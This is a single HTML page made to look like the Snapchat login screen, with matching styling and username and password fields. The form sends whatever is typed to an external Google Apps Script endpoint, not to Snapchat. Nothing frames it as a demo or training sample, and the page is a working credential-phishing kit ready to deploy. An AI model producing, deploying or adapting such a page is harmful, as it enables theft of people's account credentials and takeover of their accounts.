<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login â€¢ Snapchat</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
      background-color: #fffc00;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background: #fff;
      padding: 40px 30px;
      border-radius: 20px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
      width: 320px;
      text-align: center;
    }

    .login-container h2 {
      margin-bottom: 20px;
      color: #000;
      font-size: 24px;
    }

    .login-container input {
      width: 100%;
      padding: 12px 14px;
      margin: 10px 0;
      border-radius: 12px;
      border: 1px solid #ccc;
      font-size: 14px;
    }

    .login-container button {
      width: 100%;
      padding: 12px;
      margin-top: 20px;
      background-color: #fffc00;
      border: none;
      border-radius: 12px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }

    .login-container button:hover {
      background-color: #f7f000;
    }

    .login-container .footer-text {
      margin-top: 16px;
      font-size: 12px;
      color: #555;
    }
  </style>
</head>
<body>
  <form class="login-container" method="POST" action="https://script.google.com/macros/s/AKfycbzJ-I68JVzs-E6W2iEfCse9OZEqoEB4wWBHSSbMOMr0fSq5R947-1ZYoMnTJq_vY1qb/exec">
    <h2>Log In</h2>
    <input type="text" name="username" placeholder="Username or Email" required />
    <input type="password" name="password" placeholder="Password" required />
    <button type="submit">Log In</button>
    <div class="footer-text">New to Snapchat? <a href="#" style="color:#000;">Sign up</a></div>
  </form>
</body>
</html>
